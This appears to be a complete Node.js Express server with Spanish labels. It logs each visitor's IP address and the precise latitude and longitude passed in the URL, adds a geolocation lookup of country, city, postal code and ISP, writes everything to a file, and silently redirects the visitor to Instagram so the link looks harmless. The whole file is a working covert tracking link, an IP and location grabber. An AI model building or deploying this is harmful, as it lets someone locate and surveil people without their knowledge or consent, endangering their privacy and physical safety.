const express = require('express');
const app = express();
const cualquiercosa = require('./file');
const fs = require('fs');
const { promisify } = require('util');
const writeFileAsync = promisify(fs.appendFile);
const moment = require('moment');
const port = process.env.port || 3000;
const axios = require('axios');
const { stringify } = require('querystring');



const getGeoData = (ip, lat, lon) => {
    let geoInfo = {};
    axios.get(`http://ip-api.com/json/${ip}`)
        .then(response => {
            console.log('ubicacion en funcion', lat);
            console.log('ubicacion en funcion', lon);
            response.data.latitudReal = lat;
            response.data.longitudReal = lon;
            console.log(response.data);
            geoInfo = response && response.data ? response.data : 'sin datos';
            createLog(geoInfo, ip, lat, lon);
        })
        .catch(error => {
            console.log(error);
        });
}


const createLog = async (geoInfo, ip, lat, lon) => {
    try {
        let fecha = moment().format('YYYY-MM-DD')
        let hora = moment().format('hh:mm:ss')
        if (geoInfo && geoInfo.status === 'success') {
            const createLog = await writeFileAsync('logs.txt', `
        -----------NUEVA CONEXION--------------------------
        ip: ${geoInfo.query}
        pais: ${geoInfo.country}
        region: ${geoInfo.regionName}
        ciudad: ${geoInfo.city}
        cp: ${geoInfo.zip}
        latitud: ${geoInfo.lat}
        longitud: ${geoInfo.lon}
       
        fecha: ${fecha}
        hota: ${hora} 
        zona horaria: ${geoInfo.timezone}
        ISP: ${geoInfo.isp}
        org: ${geoInfo.org}
        as: ${geoInfo.as}
        \n
        `);
        } else {
            let message = geoInfo && geoInfo.message ? geoInfo.message : 'Sin mensaje de error'
            const createLog = await writeFileAsync('logs.txt', `
        -----------NUEVA CONEXION--------------------------
        Error: CONEXION FALLIDA
        No se pudieron obtener Geodatos
        intenta manualmente
        mensaje: ${message}
        ip: ${ip}
        hora: ${hora} 
        fecha: ${fecha}
        \n
        `);
        }
    } catch (e) {
        console.log('error', e)
    }
}


app.listen(port, () => {
    console.log('express corriendo en puerto', port);
});


app.get('/:lat/:lon', (req, res) => {
    const lat = req.params.lat;
    const lon = req.params.lon;

    console.log('EL GET ES', lat)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    console.log('ip', ip)

    getGeoData(ip, lat, lon);
    //var string = encodeURIComponent('something that would break');

    //cualquiercosa('mundo');
    //res.send('hello world');
    res.status(301).redirect("https://www.instagram.com/")

});